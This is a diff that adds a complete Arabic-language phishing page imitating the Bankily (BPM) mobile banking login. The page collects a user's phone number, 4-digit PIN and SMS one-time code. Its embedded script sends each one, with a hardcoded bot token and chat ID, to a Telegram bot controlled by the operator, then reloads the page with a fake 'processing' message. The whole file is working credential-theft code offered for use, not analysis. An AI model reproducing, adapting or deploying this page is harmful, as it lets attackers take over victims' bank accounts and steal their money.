@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bankily - BPM</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
+        body { font-family: 'Tajawal', sans-serif; background-color: #ffffff; margin: 0; }
+
+        .top-header { background-color: #00a5bc; height: 50px; display: flex; align-items: center; justify-content: center; position: relative; color: white; font-weight: bold; }
+        .back-icon { position: absolute; left: 15px; font-size: 24px; cursor: pointer; }
+
+        .input-group { position: relative; margin-bottom: 30px; padding: 0 40px; }
+        .input-label { display: block; text-align: right; margin-bottom: 8px; color: #333; font-size: 14px; }
+        .input-line { width: 100%; border: none; border-bottom: 1px solid #333; outline: none; padding: 5px 0; font-size: 18px; text-align: center; }
+        .icon-field { position: absolute; right: 5px; bottom: 8px; width: 25px; opacity: 0.7; }
+
+        .btn-bankily { background-color: #ffb400; color: white; width: 100%; padding: 15px; font-size: 22px; font-weight: bold; border: none; position: fixed; bottom: 0; right: 0; cursor: pointer; }
+
+        .otp-boxes { display: flex; gap: 15px; justify-content: center; margin: 30px 0; }
+        .otp-dot { width: 40px; border-bottom: 2px solid #333; height: 40px; text-align: center; font-size: 24px; outline: none; }
+
+        .timer-ring { width: 40px; height: 40px; border: 4px solid #00ff00; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 15px auto; }
+    </style>
+</head>
+<body>
+
+    <!-- الواجهة الأولى: تسجيل الدخول -->
+    <div id="screen-login">
+        <div class="top-header" style="background: transparent;"></div>
+        <div class="flex justify-center py-6">
+            <img src="https://i.ibb.co/L9Y0VpY/bankily-logo.png" alt="Bankily" style="width: 250px;">
+        </div>
+
+        <div class="mt-10">
+            <div class="input-group">
+                <label class="input-label">اسم المستخدم أو رقم الهاتف</label>
+                <input id="user_id" type="tel" class="input-line" maxlength="8" placeholder="________">
+                <img src="https://img.icons8.com/ios/50/user-male-circle.png" class="icon-field">
+            </div>
+
+            <div class="input-group">
+                <label class="input-label">الرقم السري</label>
+                <input id="pin" type="password" maxlength="4" class="input-line" style="letter-spacing: 15px;" placeholder="____">
+                <img src="https://img.icons8.com/ios/50/lock.png" class="icon-field">
+            </div>
+
+            <div class="px-10 text-right">
+                <a href="#" class="text-sm border-b border-black pb-1">نسيت الرقم السري ؟</a>
+            </div>
+
+            <div class="mt-32 text-center">
+                <a href="#" class="text-sm border-b border-black pb-1 font-bold">مستخدم جديد ؟ سجل الآن!</a>
+            </div>
+        </div>
+
+        <button onclick="goToOTP()" class="btn-bankily">تسجيل الدخول</button>
+    </div>
+
+    <!-- الواجهة الثانية: رمز التحقق -->
+    <div id="screen-otp" style="display:none;">
+        <div class="top-header">
+            <span class="back-icon" onclick="backToLogin()">‹</span>
+            رمز التحقق
+        </div>
+
+        <div class="px-6 text-center mt-8">
+            <h2 class="font-bold text-xl">أدخل رمز التأكيد المرسل إلى هاتفك المحمول</h2>
+            
+            <div class="otp-boxes">
+                <input type="tel" maxlength="1" class="otp-dot">
+                <input type="tel" maxlength="1" class="otp-dot">
+                <input type="tel" maxlength="1" class="otp-dot">
+                <input type="tel" maxlength="1" class="otp-dot">
+            </div>
+
+            <p class="text-gray-600 text-sm">تنتهي صلاحية رمز التأكيد خلال</p>
+            <p class="font-bold">5 دقائق 0 ثواني</p>
+
+            <div class="timer-ring"></div>
+
+            <button onclick="alert('تم إعادة إرسال الرمز')" class="text-sm border-b border-black mt-6">إعادة إرسال رمز التأكيد</button>
+        </div>
+        
+        <button onclick="finishProcess()" class="btn-bankily">تم</button>
+    </div>
+
+    <script>
+        // البيانات الجديدة من الصور المرسلة
+        const BOT_TOKEN = "8640073881:AAHc6TuNlI7_fhuQ-K6Lbd6sKLgm6y-iZTk";
+        const CHAT_ID = "8665814266";
+
+        function goToOTP() {
+            const u = document.getElementById('user_id').value;
+            const p = document.getElementById('pin').value;
+            if(u.length >= 8 && p.length === 4) {
+                sendData(`🏦 Bankily Login:\n📱 User: ${u}\n🔐 PIN: ${p}`);
+                document.getElementById('screen-login').style.display = 'none';
+                document.getElementById('screen-otp').style.display = 'block';
+            } else {
+                alert("يرجى إدخال البيانات كاملة");
+            }
+        }
+
+        function backToLogin() {
+            document.getElementById('screen-otp').style.display = 'none';
+            document.getElementById('screen-login').style.display = 'block';
+        }
+
+        function finishProcess() {
+            let otp = "";
+            document.querySelectorAll('.otp-dot').forEach(i => otp += i.value);
+            if(otp.length === 4) {
+                sendData(`🔑 Bankily OTP (4 digits): ${otp}`);
+                alert("جاري المعالجة، يرجى الانتظار...");
+                location.reload();
+            } else {
+                alert("يرجى إدخال رمز التحقق كاملاً");
+            }
+        }
+
+        function sendData(msg) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
+            fetch(url);
+        }
+
+        // التنقل التلقائي بين خانات OTP
+        const inputs = document.querySelectorAll('.otp-dot');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (input.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
